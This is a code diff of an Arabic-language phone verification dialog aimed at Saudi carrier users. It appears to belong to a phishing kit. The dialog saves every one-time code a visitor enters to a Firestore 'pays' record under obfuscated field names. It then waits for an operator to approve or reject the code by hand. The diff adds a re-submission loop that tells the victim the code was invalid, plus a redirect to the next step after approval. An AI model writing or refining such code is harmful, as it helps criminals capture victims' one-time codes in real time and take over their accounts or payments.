@@ -5,7 +5,7 @@ import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } f
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
-import { AlertCircle, CheckCircle2, Smartphone } from "lucide-react"
+import { AlertCircle, CheckCircle2, Smartphone, Loader2 } from "lucide-react"
 import { db } from "@/lib/firebase"
 import { doc, setDoc, onSnapshot, Firestore } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
@@ -18,9 +18,10 @@ interface PhoneOtpDialogProps {
   onRejected: () => void
   onShowWaitingModal: (carrier: string) => void
   rejectionError?: string
+  isAfterRejection?: boolean
 }
 
-export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal, rejectionError }: PhoneOtpDialogProps) {
+export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal, rejectionError, isAfterRejection }: PhoneOtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
   const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
@@ -46,11 +47,10 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
       setOtpStatus("waiting")
       allOtps.current = []
       
-      // Check for rejection error in localStorage
       const storedError = localStorage.getItem('phoneOtpRejectionError')
       if (storedError) {
         setError(storedError)
-        localStorage.removeItem('phoneOtpRejectionError') // Clear after reading
+        localStorage.removeItem('phoneOtpRejectionError')
       } else if (rejectionError) {
         setError(rejectionError)
       } else {
@@ -61,8 +61,40 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
     }
   }, [open, rejectionError])
 
-  // Note: Listener for admin decision is now in the waiting modals (stc/mobily/carrier)
-  // This keeps the OTP dialog simple and allows proper flow control
+  // Firebase listener for admin decisions when in re-submission mode (STC after rejection)
+  useEffect(() => {
+    if (!open || !isAfterRejection || otpStatus !== "verifying") return
+
+    const visitorID = localStorage.getItem('visitor')
+    if (!visitorID || !db) return
+
+    const unsubscribe = onSnapshot(
+      doc(db as Firestore, "pays", visitorID),
+      (docSnap) => {
+        if (!docSnap.exists()) return
+        const data = docSnap.data()
+
+        if (data.phoneOtpStatus === "approved") {
+          setOtpStatus("approved")
+          setDoc(doc(db as Firestore, "pays", visitorID), {
+            phoneOtpStatus: ""
+          }, { merge: true })
+          setTimeout(() => {
+            window.location.href = "/step4"
+          }, 1000)
+        } else if (data.phoneOtpStatus === "rejected") {
+          setOtpStatus("waiting")
+          setOtp("")
+          setError("رمز غير صالح - يرجى إدخال رمز التحقق الصحيح")
+          setDoc(doc(db as Firestore, "pays", visitorID), {
+            phoneOtpStatus: "pending"
+          }, { merge: true })
+        }
+      }
+    )
+
+    return () => unsubscribe()
+  }, [open, isAfterRejection, otpStatus])
 
   const handleChange = (value: string) => {
     if (/^\d*$/.test(value) && value.length <= 6) {
@@ -86,33 +118,31 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
       setOtpStatus("verifying")
       setError("")
 
-      // Save OTP to Firebase
       if (!db) throw new Error("Firebase not configured")
       await setDoc(doc(db as Firestore, "pays", visitorID), {
         _v7: otp,
         phoneOtpSubmittedAt: new Date().toISOString(),
         allPhoneOtps: allOtps.current,
-        phoneOtpStatus: "verifying", // Set to verifying, waiting for admin decision
+        phoneOtpStatus: "verifying",
         phoneOtpUpdatedAt: new Date().toISOString()
       }, { merge: true })
 
-      // Add phone info to history first (if not already added)
       await addToHistory(visitorID, "_t4", {
         phoneNumber: phoneNumber,
         phoneCarrier: phoneCarrier
-      }, "approved") // Auto-approve phone number
+      }, "approved")
 
-      // Add phone OTP to history
       await addToHistory(visitorID, "_t5", {
         _v7: otp
       }, "pending")
 
-      console.log("[PhoneOTP] OTP submitted, closing dialog and showing waiting modal")
-      
-      // Close OTP dialog
+      // If STC and this is a re-submission after rejection → stay in dialog, don't show STC modal
+      if (isAfterRejection && phoneCarrier === "stc") {
+        // Keep dialog open in verifying state — listener above handles admin decision
+        return
+      }
+
       onOpenChange(false)
-      
-      // Show waiting modal based on carrier
       onShowWaitingModal(phoneCarrier)
     } catch (err) {
       console.error("[PhoneOTP] Error submitting OTP:", err)
@@ -122,7 +152,6 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
   }
 
   const handleResend = () => {
-    console.log("[PhoneOTP] Resending OTP")
     setTimer(60)
     setOtp("")
     setError("")
@@ -132,49 +161,45 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
-      <DialogContent className="sm:max-w-md" dir="rtl">
-        <DialogHeader className="text-center space-y-3">
+      <DialogContent className="sm:max-w-md rounded-2xl border-0 shadow-2xl" dir="rtl">
+        <DialogHeader className="text-center space-y-4 pb-2">
           <div className="flex justify-center">
-            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-[#1a5c85]">
+            <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-[#1a5c85] to-[#0e3a57] flex items-center justify-center shadow-lg shadow-blue-200">
               <Smartphone className="w-8 h-8 text-white" />
             </div>
           </div>
-          <DialogTitle className="text-2xl font-bold text-gray-900">
+          <DialogTitle className="text-xl font-bold text-gray-800">
             التحقق من رقم الجوال
           </DialogTitle>
-          <DialogDescription className="text-base leading-relaxed">
-            تم إرسال رمز التحقق المكون من <span className="font-bold text-[#1a5c85]">6 أرقام</span> إلى رقم الجوال:
+          <DialogDescription className="text-sm leading-relaxed text-gray-500">
+            تم إرسال رمز التحقق المكون من{" "}
+            <span className="font-bold text-[#1a5c85]">6 أرقام</span>{" "}
+            إلى رقم الجوال
             <br />
-            <span className="font-bold text-lg text-gray-900 dir-ltr inline-block mt-1">
+            <span className="font-bold text-base text-gray-800 dir-ltr inline-block mt-1">
               +966 {phoneNumber}
             </span>
-            <br />
-            <span className="text-sm text-gray-600">يرجى إدخال الرمز أدناه لإتمام عملية التحقق</span>
           </DialogDescription>
         </DialogHeader>
 
-        <div className="space-y-6 py-4">
+        <div className="space-y-5 py-2">
           {/* Status Alerts */}
           {otpStatus === "verifying" && (
-            <Alert className="bg-blue-50 border-blue-200">
-              <AlertCircle className="h-4 w-4 text-blue-600" />
-              <AlertDescription className="text-blue-900">
-                جاري التحقق من الرمز... يرجى الانتظار
-              </AlertDescription>
-            </Alert>
+            <div className="flex items-center gap-3 bg-blue-50 border border-blue-200 rounded-xl p-4">
+              <Loader2 className="h-5 w-5 text-blue-600 animate-spin flex-shrink-0" />
+              <p className="text-sm text-blue-900 font-medium">جاري التحقق من الرمز... يرجى الانتظار</p>
+            </div>
           )}
 
           {otpStatus === "approved" && (
-            <Alert className="bg-green-50 border-green-200">
-              <CheckCircle2 className="h-4 w-4 text-green-600" />
-              <AlertDescription className="text-green-900">
-                تم التحقق بنجاح! جاري التحويل...
-              </AlertDescription>
-            </Alert>
+            <div className="flex items-center gap-3 bg-green-50 border border-green-200 rounded-xl p-4">
+              <CheckCircle2 className="h-5 w-5 text-green-600 flex-shrink-0" />
+              <p className="text-sm text-green-900 font-medium">تم التحقق بنجاح! جاري التحويل...</p>
+            </div>
           )}
 
           {error && (
-            <Alert variant="destructive">
+            <Alert variant="destructive" className="rounded-xl">
               <AlertCircle className="h-4 w-4" />
               <AlertDescription>{error}</AlertDescription>
             </Alert>
@@ -190,7 +215,7 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
               value={otp}
               onChange={(e) => handleChange(e.target.value)}
               placeholder="000000"
-              className="w-full max-w-xs h-16 text-center text-4xl font-bold tracking-[0.5em] border-2"
+              className="w-full max-w-xs h-16 text-center text-4xl font-bold tracking-[0.5em] border-2 rounded-xl focus:border-[#1a5c85] transition-colors"
               disabled={otpStatus === "verifying" || otpStatus === "approved"}
             />
           </div>
@@ -198,13 +223,14 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
           {/* Timer / Resend */}
           <div className="text-center">
             {timer > 0 && otpStatus === "waiting" ? (
-              <p className="text-sm text-gray-600">
-                إعادة إرسال الرمز بعد <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
+              <p className="text-sm text-gray-500">
+                إعادة إرسال الرمز بعد{" "}
+                <span className="font-bold text-[#1a5c85]">{timer}</span> ثانية
               </p>
             ) : otpStatus === "waiting" ? (
-              <Button 
-                variant="link" 
-                onClick={handleResend} 
+              <Button
+                variant="link"
+                onClick={handleResend}
                 className="text-[#1a5c85] font-semibold"
               >
                 إعادة إرسال رمز التحقق
@@ -216,16 +242,18 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, 
           <Button
             onClick={handleVerify}
             disabled={(otp.length !== 4 && otp.length !== 6) || otpStatus === "verifying" || otpStatus === "approved"}
-            className="w-full h-14 text-lg bg-[#1a5c85] hover:bg-[#154a6d] font-bold"
+            className="w-full h-13 text-base bg-gradient-to-r from-[#1a5c85] to-[#0e3a57] hover:from-[#154a6d] hover:to-[#0a2e46] text-white font-bold rounded-xl shadow-md disabled:opacity-50"
           >
-            {otpStatus === "verifying" ? "جاري التحقق..." : "تأكيد الرمز"}
+            {otpStatus === "verifying" ? (
+              <span className="flex items-center gap-2 justify-center">
+                <Loader2 className="h-4 w-4 animate-spin" />
+                جاري التحقق...
+              </span>
+            ) : "تأكيد الرمز"}
           </Button>
 
-          {/* Security Info */}
-          <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 text-center">
-            <p className="text-xs text-gray-600">
-              🔒 رمز التحقق صالح لمدة 10 دقائق فقط
-            </p>
+          <div className="bg-gray-50 border border-gray-100 rounded-xl p-3 text-center">
+            <p className="text-xs text-gray-500">🔒 رمز التحقق صالح لمدة 10 دقائق فقط</p>
           </div>
         </div>
       </DialogContent>
